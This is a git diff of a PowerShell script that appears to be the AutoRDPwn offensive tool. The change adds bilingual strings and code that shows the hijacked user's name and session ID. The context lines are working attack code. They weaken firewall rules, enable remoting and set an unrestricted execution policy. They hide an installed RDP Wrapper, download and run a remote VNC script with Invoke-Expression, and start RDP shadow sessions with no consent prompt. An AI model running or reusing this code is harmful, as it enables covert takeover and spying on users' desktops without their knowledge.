@@ -149,6 +149,8 @@ if($Language -in 'English') {
   $txt63 = "Paste in your Metasploit Framework Console:` "
   $txt64 = "Backdoors and persistence"
   $txt65 = "Enter the IP where MSF is running:` "
+  $txt66 = "User session` "
+  $txt67 = "detected, with Id number` "
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; netsh advfirewall firewall set rule group='Remote Desktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
@@ -222,6 +224,8 @@ if($Language -in 'Spanish') {
   $txt63 = "Pega esto en tu consola de Metasploit Framework:` "
   $txt64 = "Backdoors y persistencia"
   $txt65 = "Introduce la IP donde se está ejecutando MSF:` "
+  $txt66 = "Sesión del usuario` "
+  $txt67 = "detectada, con Id número` "
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes ; netsh advfirewall firewall set rule group='Escritorio Remoto' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
@@ -618,8 +622,9 @@ if($Language -in 'Spanish') {
     netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
     attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2>&1> $null }
 
-    $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId }
+    $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId } ; $remoteusername = invoke-command -session $RDP[0] -scriptblock { [Environment]::username } 
     $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt35" -ForegroundColor Blue ; sleep -milliseconds 2500
+    Write-Host "$txt66" -NoNewLine ; Write-Host $remoteusername -ForegroundColor White -NoNewLine ;  Write-Host "$txt67" -NoNewLine ; Write-Host $shadow -ForegroundColor White
     if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
     if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
     if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
